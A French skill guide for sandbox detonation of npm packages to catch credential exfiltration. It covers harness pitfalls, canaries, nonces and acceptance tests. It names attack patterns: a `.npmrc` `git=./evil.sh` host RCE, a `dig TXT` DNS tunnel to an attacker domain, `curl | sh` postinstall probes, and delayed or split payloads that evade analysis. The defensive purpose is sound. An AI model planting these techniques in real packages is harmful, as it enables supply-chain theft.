---
name: sandbox-detonation-npm
description: Use when detonating npm packages to prove exfiltration.
---

# Détonation npm — prouver ou innocenter par l'exécution

Le statique trie, la sandbox juge. Mais une sandbox qui ne fait que `require()`
ne juge rien : elle regarde. Cette skill décrit la seule forme de détonation qui
produit une **preuve** (quel secret sort, vers quel hôte) ou une **absence
étayée**, et les pièges qui transforment un run en faux négatif.

Tant que le banc de sondes ne mesure pas la sandbox, un « rien vu » ne vaut rien :
commencer par le banc, puis durcir.

## Règle d'or : faire relire AVANT de lancer

Tout run de plus d'une heure est relu par **deux modèles différents** (Mistral
et hy4 en second vérificateur) sur le script et le pilote exacts. Un protocole
faux coûte des heures et produit des chiffres faux. Poser des questions fermées
(BLOQUANT / NON BLOQUANT) et exiger la ligne à corriger.

Faire **alterner** les deux vérificateurs sur plusieurs passes : chaque passe reçoit
l'avis de la précédente et doit dire ce qu'elle **retire** et ce qu'elle **maintient**.
C'est là que les erreurs tombent — un vérificateur a retiré sa propre explication de
cause après la critique de l'autre, et son critère de stabilité avec. Un avis de
vérificateur **localise**, il ne prouve pas : le banc tranche, et quand les deux se
contredisent, chercher la trace dans les fichiers plutôt qu'arbitrer entre deux textes.
Ne jamais déclarer « stable » sur quelques runs : trois runs verts ne prouvent rien
(pour réfuter un défaut à 10 % à 95 %, il faut ~29 runs). Écrire une **injection de
faute déterministe** — elle tranche en un seul run.

## Les trois couches

1. **disque** : snapshot avant/après sur des racines nommées ;
2. **système** : `strace -f` sans filtre ;
3. **applicatif** : harnais qui journalise les canaux (`require`, `fs.*`,
   `child_process.execSync`, `net.connect`, `https.request`, `processus`).

Un quatrième journal, le **faux-Internet**, enregistre chaque requête (SNI,
chemin, en-têtes, corps) : c'est lui qui porte la preuve.

## Le scénario qui déclenche (scripts/sbx-scenario3.sh)

Un pilote remplace temporairement `main`, sans toucher au code du paquet :

- écrit **12 états de victime** avec des canaris distincts (npmrc, ssh, aws, gh,
  docker, kube, git, env, gcloud, session WhatsApp, cookies, historique) ;
- **plafonne `setTimeout`/`setInterval`** à 1,5 s (un appel à 3 jours part) ;
- exécute les scripts **preinstall/install/postinstall/prepare** — `require()`
  ne les exécute jamais, c'est le vecteur n°1 ;
- exécute les **`bin`** (`--help`, `--version`) ;
- charge le vrai point d'entrée (**ESM par `await import()`**) et pilote ses
  exports avec une session factice + `connection.update`/`messages.upsert`.

La preuve se lit dans `scripts/cles_scenario3.py` : un canari dans un événement
**réseau** vers un hôte ≠ registry, ou dans une commande exécutée.

## Les treize pièges (tous mesurés)

0. **`exports` prime sur `main`** : Node l'ignore. Lister `main`/`index.js` d'abord
   fait charger un leurre bénin et rater la charge utile. Ordre = `exports` d'abord.
   Corollaire : charger **toutes** les entrées (import ET require), pas la première.
1. `npm install --ignore-scripts` : neutralise le vecteur n°1. Installer sans
   scripts sur l'hôte (réseau), puis **rejouer les scripts dans le conteneur** —
   ceux du paquet **et ceux des dépendances** (liste `_sbx_deps_scripts.json`
   construite après installation, 20 scripts max, 3 s chacun).
2. Timeout de 30 s : un `setTimeout` de 3 jours ne se déclenche jamais. Plafonner
   les globales, `require('node:timers')` **et** `timers/promises` — `setTimeout`,
   `setInterval` et `scheduler.wait` : chaque variante oubliée est un timer libre.
   Intercepter `Module._load`, pas seulement les globales.
3. Canari cherché dans `events.jsonl` : le pilote écrit lui-même les fichiers,
   donc **12 faux positifs par paquet**. Ne compter que le réseau.
4. Canari envoyé au **registry** : seul le **jeton npm** y est un usage normal
   (un script qui appelle npm relit `~/.npmrc`). Une session WhatsApp, une clé SSH
   ou des cookies envoyés au registry restent une fuite : ne jamais exempter
   l'hôte entier, exempter le seul canari du jeton. Comparer l'hôte par
   **égalité** (`registry.npmjs.org.attaquant.test` n'est pas le registry).
5. Jeton que le harnais pose lui-même (`CANARI_FACTICE`) : l'exclure.
6. `main` remplacé puis `require(P)` : le pilote **se require lui-même** et rend
   `{}`. Jamais `require(P)`.
7. Paquet `type: module` : un pilote `.js` meurt (`require is not defined`).
   Pilote en `.cjs`, cible chargée par `await import()`.
8. `execSync` à `timeout: 25000` × 4 scripts + × 8 bins : 196 s bloquants pour
   un run de 90 s. Budget global, 8 s par script, 4 s par bin.
9. « Rien vu » sans trace de progression : indistinguable de « jamais exécuté ».
   Écrire la trace dans le **répertoire que le harnais ramène** (`/work/out`),
   jamais dans le paquet : le dossier du paquet n'est pas copié après le run et
   la trace disparaît avec le conteneur (voir aussi le piège 15).
10. Le harnais porte l'URL et le corps dans `valeur`, pas dans `url`/`chemin`.
    Chercher les preuves là aussi, sinon une sonde qui atteint son hôte reste « — ».
11. Compter « toute valeur contenant un point » comme une URL **fabrique des clés**.
    Extraire les URL, parser l'hôte.
12. Un banc sans témoin propre ne mesure rien : la sonde témoin doit rester muette,
    sinon chaque « amélioration » peut être une machine à faux positifs. La placer
    **en dernier** dans la liste pour que sa vérification soit positionnelle.
    Un témoin muet ne prouve que l'absence de faux positifs — **il ne dit pas que
    le banc a tourné**. Le doubler d'un **contrôle positif**, une sonde dont on sait
    qu'elle doit toujours frapper : c'est la seule chose qui distingue « rien
    trouvé » de « rien mesuré ».
13. Énumérer `node_modules` à plat rate **tous les paquets scopés**
    (`node_modules/@scope/nom`) : la moitié de l'écosystème n'est alors jamais
    inspectée. Descendre d'un niveau dans les dossiers `@*`.
14. Une sonde qui ne parse pas rend « — » : c'est un faux négatif du **banc**, pas
    une force de la sandbox, et il pousse à « corriger » un trou qui n'existe pas.
    Deux causes vues : du JS fabriqué depuis une chaîne hôte où les guillemets
    imbriqués cassent le fichier, et une modification de sonde non revérifiée.
    Règle : garder les charges utiles **sans guillemets imbriqués** (construire les
    chaînes par concaténation ou `String.fromCharCode`, passer les chemins par
    variable), puis `node --check` sur **chaque** sonde générée avant de croire au
    banc. Une sonde doit d'abord être détectée par construction ; si elle ne l'est
    pas, suspecter la sonde avant la sandbox.
15. Un paramètre de scénario passé par **variable d'environnement** est perdu en
    silence : `sudo` réinitialise l'environnement (`VAR=x sudo -n bash script.sh`
    ne transmet rien) et le harnais lance la cible avec un environnement contrôlé.
    Symptôme : la sonde reste muette exactement comme si le paramètre valait zéro.
    Transmettre par **fichier** déposé à côté du pilote (`_sbx_offset.json`) et lu
    au démarrage, ou par `sudo -n env VAR=… bash …` pour ce qui pilote les
    processus extérieurs (docker, timeout).

16. **Une lecture n'est pas une exfiltration.** Attribuer un canari au réseau
    parce qu'il apparaît dans un événement du **harnais** (`fs.readFileSync` dont
    le détail contient le contenu lu) fabrique une preuve flatteuse et fausse :
    le fichier a été lu, rien n'est sorti. Seuls les canaux réseau
    (`http.corps`, `net.write`, DNS, URL) peuvent alimenter `canaris_reseau` ;
    tout `fs.*` alimente au plus une lecture. Corollaire qui vaut pour toute
    mesure : **avant d'annoncer qu'un matcher attrape une forme encodée,
    chercher cette forme exacte dans le journal** — si ni la chaîne nue ni sa
    forme encodée n'y sont, la « preuve » vient d'ailleurs.
17. **Un encodage n'est pas composable.** La base64 du fichier ne contient pas la
    base64 du canari qu'il renferme : chercher `b64(canari)` dans un corps qui
    encode `b64(fichier)` ne trouve rien, quel que soit l'alignement du secret.
    Il faut générer les trois alignements (0, 1, 2 octets de tête nuls) et
    chercher le **milieu stable** de chaque encodage (`enc[4:-4]`), plus les
    variantes url-safe, padding optionnel, hex et percent. Sans ça, un
    `postinstall` qui sérialise un fichier en base64 passe pour muet.

18. **Un run absent n'est pas un paquet muet.** Quand la paire de conteneurs
    tourne des heures et sert toutes les sondes, l'état dérive : le dossier de
    sortie est emporté entre deux paquets (`ERREUR ORCHESTRATEUR : ENOENT …
    /work/out/run/events.jsonl`), le journal réseau tombe à zéro ligne, et
    l'agrégateur rend « — ». Compter ces sondes comme « aucun geste » accuse le
    paquet à la place du banc — c'est le faux négatif le plus coûteux, parce
    qu'il est silencieux et qu'il pousse à « corriger » un trou inexistant.
    Règle : **l'absence de `run/entrees.jsonl` vaut `BANC INVALIDE`**, jamais
    « muette » ; vérifier avant chaque sonde que le conteneur est vivant, que le
    dossier de sortie existe, et que le journal réseau répond ; rejouer par
    **lots de six** plutôt que vingt d'un trait, en redémarrant la paire entre
    les lots. Un score lu sur un run dont une seule sonde est invalide est nul.

19. **Un échec d'écriture n'est pas un banc invalide, et l'inverse non plus.**
    Deux pannes se ressemblent et exigent l'action opposée :
    *rien produit du tout* → la sonde n'a pas eu lieu, on rejoue, on ne compte
    pas ; *rien produit, mais le sink a vu passer le canari ou l'hôte* → la
    détection a eu lieu et n'a pas pu être écrite : c'est une **DETECTION NON
    LOGGUEE**, à rejouer et **jamais** à effacer en la déclarant invalide. Un
    garde-fou qui ne fait pas cette distinction finit par blanchir de vraies
    détections. **Le `stderr` ne sert jamais de preuve** : il est écrit dans le
    répertoire du paquet, qui peut le laisser vide tout en exfiltrant — seul le
    journal du faux-Internet fait foi. Second piège, mesuré : le contrôle doit lire
    **le répertoire où
    le harnais écrit** (`runs-obs/<tag>/run/entrees.jsonl`), pas le dossier de
    travail du scénario — au mauvais chemin il crie « invalide » sur une sonde
    qui a rendu CLÉ. Règle : si le garde-fou contredit le fichier de clés, c'est
    le garde-fou qui est faux.

20. **Ne jamais rien insérer au milieu d'une commande shell multiligne.** Un
    ajout glissé entre une ligne finissant par `\` et sa continuation casse la
    commande **sans que `bash -n` le voie** : `sudo -n env VAR=… \` suivi d'autre
    chose n'exécute plus que `env`, qui imprime son environnement. Symptôme dans
    la sortie : un dump `HOME=… SUDO_COMMAND=…` et des runs à « 0 entrée » en
    série. Après toute retouche d'un script de scénario, lancer **une** sonde au
    premier plan et lire les premières lignes : un dump d'environnement signifie
    que la ligne de commande a été tronquée. Ancrer le patch sur la commande
    complète, ou la réécrire en entier.

21. **Un artefact présent n'est pas un artefact de CETTE sonde.** Le fail-closed
    ferme le mensonge par silence (rien produit) et laisse ouvert le mensonge par
    **attribution** : quand la paire de conteneurs sert toutes les sondes, un
    processus de la sonde précédente peut encore écrire dans un dossier de sortie
    recréé au même chemin, et déposer ses canaris dans la sonde courante. Le sink
    l'accepte, le verdict lit `CLÉ` — un positif **forgé**, indistinguable d'une
    vraie détection. Le contrôle « dossier inscriptible » ne protège pas : c'est
    exactement la condition dont l'orphelin a besoin, il la confirme au lieu de
    l'exclure. Règle : tout événement doit porter de quoi dire **quelle sonde** l'a
    produit (identifiant unique par sonde exigé côté sink, ou isolation stricte des
    sorties) ; sans cela, aucun `CLÉ` n'est publiable et aucun chiffre de run n'est
    citable. Toute modification du chemin de sortie du harnais se valide sur **une**
    sonde avant un lot — un chemin changé peut rendre toutes les sondes muettes.

22. **Un verdict recopié champ par champ se perd en silence.** La branche
    fail-closed calculait bien `verdict: "BANC INVALIDE"`, mais `main()` reconstruit
    chaque ligne dans un dict neuf (`{tag, hotes, execs, …}`) et **la clé `verdict`
    n'y était pas** : la branche ne s'exécutait jamais, et un run sans
    `entrees.jsonl` sortait « — ». Un calcul juste dans une fonction morte ne protège
    rien. Tester la **branche** (un dossier sans `run/entrees.jsonl` doit sortir
    `BANC INVALIDE`), pas la fonction qui la produit.
23. **Un dossier de run périmé est lu comme une détection.** Une sonde refusée par
    une garde (`continue`) n'appelle jamais le harnais, mais son ancien
    `runs-obs/<tag>` reste en place : l'agrégateur le relit et rend `CLÉ`. Reproduit
    par `cp -r runs-obs/<ancien> runs-obs/<neuf>` → `CLÉ` avec le canari d'une autre
    sonde. Purger le dossier de sortie **avant** chaque sonde, ou exiger un
    identifiant de sonde dans les événements (piège 21).

## Fermer l'attribution : le nonce par sonde (prouvé)

Le piège 21 (artefact d'une autre sonde lu comme `CLÉ`) se ferme par un **nonce
par sonde**, et par rien d'autre :

- nonce de 128 bits tiré **côté hôte**, inscrit dans un registre à 8 colonnes
  (`registre.tsv`, colonne 3) **avant** la détonation ;
- `SBX_NONCE` exigé par `detoner-obs.sh` : sans lui, la détonation est **refusée**
  (`exit 4`), et transmis au conteneur par `-e SBX_NONCE=` ;
- posé **au point d'écriture unique** du journal (`ecrireBrut()` dans `lib/sbx/log.js`),
  pas dans les appelants : toutes les lignes le portent, `pid`, `cap_atteint` et
  `_fin` compris ;
- propagé aux processus enfants par `harness.js` (`ctx.envEnfant`), sinon leurs
  lignes sortent avec un nonce vide et sont rejetées ;
- compteur `echecs_ecriture` publié dans `_fin` : une écriture ratée laisse une trace.

Le lecteur refuse un événement dont le nonce n'est pas celui de la sonde
(`ATTRIBUTION INVALIDE`) et **refuse de conclure sans registre**
(`REFUS : registre absent — dénominateur inconnu, aucun verdict`). Sans
`sondes/attendus.json`, il rend `BANC NON RECEVABLE` avec « sans attendu » par sonde.

Les cinq tests d'acceptation, tous exécutés :

| Test | Attendu |
|---|---|
| T-H1 copier `events.jsonl` de N dans N+1 (inscrit au registre) | `ATTRIBUTION INVALIDE` + `BANC NON RECEVABLE` |
| T-H2 banc complet, redémarrage entre sondes | témoin `—`, aucun leurre hors du leurre |
| T-H3 banc complet **sans** redémarrage | témoin `ATTRIBUTION INVALIDE (FORGE DÉMONTRÉE)` ; s'il sort `—`, test non concluant |
| T-H4 deux bancs en parallèle | le 2e `rc=75`, aucune détonation |
| T-H5 `jq -r .nonce events.jsonl \| sort -u` | une seule valeur = colonne 3 du registre |

**Le témoin doit sortir `—`, jamais `CLÉ`.** Deux vérificateurs ont exigé l'inverse :
appliqué à la lettre, ce critère valide un banc contaminé.

**Le verrou bloque aussi vos propres tests.** `flock` avec `rc=75` est correct, mais une
unité `systemd-run --wait` encore `active` tient le verrou : le test suivant est refusé
en 8 ms et il faut attendre la fin réelle de l'unité, pas du `sleep`.

## Le langage ne déplace pas l'interception

Ni Rust ni Go ne changent le **niveau** d'interception : un hôte embarqué obéit à
`spawn('sh',…,{env:{}})`, et `LD_PRELOAD` meurt avec `env -i`. Seul `seccomp` +
`SECCOMP_RET_USER_NOTIF` (hérité par `fork`/`exec`) tient. Débat complet, chiffres et
défauts propres à Go : `references/niveau-interception.md`.

## RCE sur l'hôte par un `.npmrc` du tarball

Un `.npmrc` glissé dans un paquet (`git=./evil.sh` + une dépendance `git`) s'exécute
pendant `npm install --ignore-scripts`, **sur l'hôte, avec les droits de
l'utilisateur** : `--ignore-scripts` ne couvre pas la résolution git. Correctif :

- supprimer du paquet extrait `.npmrc`, `.yarnrc`, `.yarnrc.yml`, `.pnpmfile.cjs` ;
- passer `--userconfig` **et** `--globalconfig` sur **deux fichiers vides distincts**
  (`/dev/null` ×2 fait refuser npm : plus aucune installation, ce qu'un test
  d'installation réelle révèle) ;
- ajouter `--git=/bin/false`.

Contre-épreuve obligatoire : sans les drapeaux, la charge doit s'exécuter. Si elle ne
s'exécute pas non plus, le test ne discrimine pas et le correctif n'est pas prouvé.

## Des sondes qui ne testent pas ce qu'elles annoncent

Avant de conclure d'une sonde muette, vérifier qu'elle **peut** frapper. Cas réels :
une sonde censée tester `require.main` frappait en réalité par la fonction exportée
(le harnais appelle les exports, donc elle ne prouvait rien) ; une sonde d'encodage
était alignée à zéro, ce qui ne teste aucun décalage ; une sonde censée lire
`~/.npmrc` n'y avait pas de ligne `registry=`. Et surtout : **le simple contact de
l'hôte sink suffit pour une `CLÉ`**, donc le matcher de canaris n'est jamais
sollicité — une sonde qui n'émet aucun canari ne teste pas le matcher.

## Le banc de sondes (scripts/fabrique_sondes.py)
Dix-neuf classes malveillantes + un témoin : postinstall, ESM, timer 3 jours, bin
seul, jeton npm, config C2, `exports` sans `main`, payload `eval`, shell+curl,
hook auto-installé, session WhatsApp, **charge utile dans `exports` derrière un
`index.js` bénin**, **postinstall d'une dépendance**, **charge qui n'agit qu'après
30 jours** (horloge), **loader gardé par `require.main === module`**, **binaire
absent au `postinstall`** (`curl | sh` : l'échec doit ressortir, pas le silence),
**charge répartie sur deux modules** (lecture dans `lib/collect.js`, envoi dans
`lib/wire.js` : aucun fichier ne porte les deux, ce qu'un statique ne peut pas
corréler), **hôte déduit de `~/.npmrc`** (aucune URL littérale dans le paquet).

**Toute sonde nouvelle exige un couple discriminant**, sinon elle ne prouve rien :
un paquet qui frappe dans la condition de contrôle *et* dans la condition testée
mesure le décor, pas le mécanisme. Cas réel : une sonde d'horloge dont la date
d'installation était « il y a 30 jours » frappait aussi sans décalage — elle
franchissait son seuil dans les deux cas. Le contrôle doit être construit pour
*échouer* si le mécanisme manque (installé il y a 1 jour, seuil 30 jours).

Note de mesure : le banc compte dix-neuf classes plus le témoin. **Aucun chiffre
agrégé n'est publiable sans avoir vérifié, sonde par sonde, qu'elle a bien produit
son `entrees.jsonl`** : trois passes complètes de suite ont rendu 17, puis 13,
puis 12 — non pas parce que le moteur bougeait, mais parce que six à sept sondes
n'avaient pas eu lieu et se lisaient « muettes » (piège 18). Ce qui se cite, c'est
le résultat des sondes mesurées individuellement, ou un run complet dont chaque
ligne est validée.

Chaque sonde ajoutée se rejoue **avec le banc entier** : deux sondes déjà vertes
sont tombées muettes après l'ajout d'une troisième, à cause d'un hook enrichi —
le score se lit sur le run complet, jamais sur le paquet isolé. Mais un run
complet peut aussi être invalide pour cause de banc : avant de conclure à une
régression, vérifier que **chaque** sonde a bien produit son `entrees.jsonl` et
que le journal réseau n'est pas vide.

## Audit en boucle (scripts/audit_sandbox_20.py)

Le protocole se durcit par **tours** : un panel de modèles relit le code exact et
rend des constats, puis le **banc est rejoué**. Le banc est le juge, le panel est
l'inspirateur : un constat n'est retenu que si le score tient et que le témoin
reste muet. Détail du panel, du format de constat et de la veille :
`references/audit-loop.md`.

## Limites assumées (à énoncer, pas à masquer)

- **Le temps n'est simulé qu'à moitié.** Plafonner les délais fait partir un
  `setTimeout` de trois jours en 1,5 s, et le décalage d'horloge (`_sbx_offset.json`)
  fait franchir un seuil « 30 jours écoulés » — vérifié par sonde, avec contrôle
  muet à 1 jour. Restent hors d'atteinte : les charges qui comptent des **tics**
  (`setInterval` × N) plutôt que du temps, les horloges des **binaires natifs**, et
  `process.uptime()`/`performance.now()` non décalés sauf patch explicite.
- **Tunnel DNS** : le faux-Internet voit SNI/HTTP, pas les requêtes UDP brutes.
  Un `dig TXT <base32>.attaquant.tld` passe sous le journal sans laisser de trace.
- **Phase d'installation** : installée hors sandbox (`--ignore-scripts`) puis
  rejouée ; l'ordre npm réel, les builds natifs et les résolutions transitives ne
  sont pas observés.
- **Canaris absents de la liste** : `ENV` et `MSG` manquaient à `CANARIS_CONNUS`,
  donc un environnement ou un message WhatsApp encodés n'étaient jamais cherchés.
  Une liste de canaris se relit contre ce que le semeur pose réellement.
- **Canari encodé** : les variantes brutes (base64 std/url-safe avec et sans
  padding, hex, percent) sont calculées, mais **aucune sonde ne les a encore
  validées** : la sonde qui encode un fichier en base64 reste muette, faute des
  trois alignements du piège 17. Ce trou ne doit pas être annoncé comme fermé
  avant qu'une sonde dédiée ne l'ait prouvé dans les deux sens.

## Concurrents et inspiration

La cartographie des dépôts qui font la même chose, ce qu'ils font mieux, ce qu'il
ne faut PAS copier, et la recette pour les lire sans brûler le quota GitHub :
`references/concurrents.md`.

## Passation à un tiers

Quand la correction est confiée à quelqu'un qui n'a pas vécu la session (Claude, un
relecteur, une session future), le dossier doit rendre les trous reproductibles :
avertissement en tête, problèmes numérotés avec le test qui tranche, corrections
échouées documentées comme échouées, passes de vérificateurs verbatim.
Recette complète et arborescence : `references/passation.md`.

**Le paquet de preuve se construit depuis le chemin DÉPLOYÉ**, jamais depuis un miroir
ou une copie de travail : une annexe prise dans le miroir a montré un harnais d'avant le
correctif, et le relecteur a eu raison de refuser le chiffre — le code qu'il lisait
n'était pas celui qui avait tourné. Joindre : `sha256sum` de l'arbre déployé, la même
liste pour la version qui a réellement produit les runs cités, les registres bruts, la
sortie brute du lecteur et l'archive des dossiers de run. Dire **quelle version a
tourné quoi** ; sans cela le relecteur ne peut pas recompter et tout le dossier tombe.

Un test de sécurité qui ne discrimine plus (contre-épreuve impossible à reproduire sur
la version d'outil installée) s'écrit `INCONCLUANT`, **jamais `OK`** — et on ne fige
jamais une vieille version de l'outil pour le faire passer : c'est rouvrir la faille
pour sauver le test.

## Ce qu'un « rien » veut dire

Aucun canari sorti, aucun hôte hors registry, aucun `exec` inattendu, sous
scripts de cycle de vie + bins + exports pilotés + délais écrasés : c'est une
**absence étayée**, pas une innocence. La formuler ainsi, jamais « le paquet
est propre ».

## Un banc ne vaut que par ses refus

Trois refus motivés valent mieux que vingt détections. Les mesurer avant de citer un chiffre :

- **Injection de faute** : copier les événements d'une sonde A dans le dossier d'une sonde B **inscrite au registre** → le lecteur doit répondre `ATTRIBUTION INVALIDE` et le banc `NON RECEVABLE`. Copier dans un tag non inscrit ne prouve rien : il sort `HORS REGISTRE (ignoré)`.
- **Protection retirée** : relancer sans redémarrage du conteneur ; l'orphelin du leurre doit frapper dans le témoin et sortir `ATTRIBUTION INVALIDE — FORGE DÉMONTRÉE`. S'il sort `—`, le test est non concluant, le consigner sans conclure.
- **Concurrence** : deux bancs en parallèle, le second doit sortir `rc=75` immédiatement.

## Le témoin muet est le critère, pas le témoin détecté

Des vérificateurs LLM (Mistral, hy4) ont exigé « `p12-propre` = CLÉ » comme critère de passage. **Ce critère valide un banc contaminé.** Le témoin doit sortir `—`. Un dossier de run périmé, ou les canaris d'une sonde précédente, produisent un `CLÉ` parfaitement crédible : l'exiger revient à exiger la contamination.

## Mesure honnête

Seul `BANC RECEVABLE` (code 0) se cite. Tout autre verdict : lire la colonne des raisons, ne pas transformer en chiffre.

Le protocole complet, les scripts réels et le journal d'audit vivent sur
`github.com/boris21dd-sketch/sandbox-detonation-npm`. Toute amélioration y est
publiée avec sa mesure (`scripts/publier.sh "titre" "avant → après"`), pour que
l'historique dise ce qui a été corrigé **et ce que ça a changé**.

Le jeton ne doit **jamais** être stocké dans ce dépôt : le remote reste une URL
propre, et `publier.sh` emprunte le jeton du dépôt de travail au moment du push.
Une URL `https://user:token@…` dans `.git/config` d'un dépôt public finit par
être publiée ou copiée — c'est une fuite en attente.

## Un hook qui lève casse la mesure

Enrichir un hook (`child_process`) sans entourer l'émission d'un `try/catch`
fait échouer l'appel chez le paquet : deux sondes qui passaient sont devenues
muettes, et le banc l'a vu avant moi. **Tout ajout dans un hook s'enveloppe.**
Corollaire : un binaire absent (`curl`, `git`) n'est pas un paquet propre —
l'échec d'exécution s'émet sous `exec_indisponible`.

## Module d'entrée, pas seulement require()

`require.main === module` est **faux** sous `require()` : un loader gardé par ce
test reste invisible pour un harnais qui se contente de charger les entrées. Le
pilote exécute donc aussi le vrai `main` comme **processus node** (`entree`),
puis laisse une **fenêtre de settle** (~8 s, silencieuse) pour les charges
détachées (`spawn detached`, `unref`) qui rendent la main tout de suite.

Preuve exigée : sonde `p16-main-module` qui ne frappe QUE sous `require.main`
— muette avant la passe, CLÉ après. Un banc sans cette sonde ne prouve rien.

## Le plafond des délais ne doit pas couper la fenêtre du harnais

Plafonner `setTimeout` pour faire partir une charge de trois jours est juste, mais le
même plafond s'applique au harnais : la fenêtre de settle du module d'entrée est tombée
de 8 s à 1,6 s, et l'étape qui pilote les exports (`piloter()`) n'était **plus jamais
appelée**. Mesure : le `_sbx_etat.jsonl` du run ne contenait aucune étape `pilote`.
Toute charge déclenchée à l'usage (session WhatsApp, handler d'événement) passait
inaperçue, alors que le banc affichait des `CLÉ` — obtenus par un **autre** canal (le
`postinstall`), ce qui rendait le score crédible et faux.

Règles :

- plafond et horloge se posent dans **chaque** processus instrumenté, pas seulement
  dans la cible : précharger `lib/sbx/temps.js`, avec `syncBuiltinESMExports` pour
  couvrir `node:timers`, `timers/promises`, un délai passé en texte et les
  petits-enfants node ;
- le plafond ne s'applique qu'au code du paquet, jamais à la fenêtre d'observation
  du harnais ;
- **prouver que le harnais est allé au bout** : lire son propre journal d'étapes et
  exiger la séquence complète (`demarrage → … → main → entree_module → pilote →
  fin`). Une étape manquante invalide le run entier, même si toutes les sondes sont
  `CLÉ` et que le lecteur dit `BANC RECEVABLE`.

Corollaire : **dire par quel canal un `CLÉ` a été obtenu**. Lire les événements pour
trouver le canal porteur (`fs.writeFileSync` vs `http.corps`) ; un canari sorti par
écriture de fichier ne prouve pas que le réseau est vu, et un `CLÉ` obtenu par un canal
inattendu ne valide pas la sonde qu'on croyait testée.

## Horloge accélérée (mois/années)

Plafonner les délais ne suffit pas : une charge qui compare des dates
(`Date.now() - installe > 30 jours`) ne se déclenche jamais. Le pilote décale
donc l'horloge du paquet (`_sbx_offset.json` à côté du pilote, `SBX_OFFSET_JOURS`).
**Deux pièges mesurés :**

- **Le budget du harnais doit lire la VRAIE horloge.** En décalant `Date.now()`
  globalement, `reste()` voit 30 jours écoulés et saute tout, vrai code compris :
  la sonde reste muette pour la mauvaise raison. Capturer `VRAI_NOW_MS` avant le
  décalage et l'utiliser pour le budget uniquement.
- **`sudo` ne propage pas l'environnement.** Les paramètres de scénario passent
  par `sudo -n env VAR=... bash detoner-obs.sh`, et à l'intérieur du conteneur par
  un **fichier** (l'environnement du paquet est contrôlé par le harnais).

Contrôle obligatoire : installé il y a 1 jour + offset 0 → muet ; même paquet +
offset 30 → la sonde frappe. Sans ce couple, le test ne prouve rien.

## Enchaînement

0. Construire ou rejouer le banc **avant** de promettre quoi que ce soit :
   `python3 scripts/fabrique_sondes.py` puis
   `bash scripts/sbx-scenario3.sh /tmp/liste_sondes.tsv <prefixe> 120`.
   Avant chaque sonde, `scripts/verifier_banc.sh --avant` (état des conteneurs,
   journal réseau, dossier de sortie) ; après chaque sonde,
   `scripts/verifier_banc.sh <tag>` — code 0 = mesure valable, 1 = banc invalide
   à rejouer, 2 = détection non loguée à rejouer **sans jamais la compter muette**.
   Le contrôle positif (une sonde qui doit toujours frapper) passe avant de citer
   le moindre chiffre.
1. `bash scripts/sbx-scenario3.sh <liste.tsv nom\ttgz> <prefixe> 120`
2. `python3 scripts/cles_scenario3.py <prefixe>` → une ligne par paquet, `CLÉ`
   ou `—`, avec les hôtes et les canaris sortis.
3. Verser les clés dans le rapport ; ne jamais promouvoir une règle statique sur
   la base d'un run partiel. **Recompter mécaniquement tout total annoncé**
   (« 6 sur 12 ») depuis les fichiers de résultats, jamais de mémoire : un
   décompte faux invalide tout le reste du rapport, même si les règles sont justes.
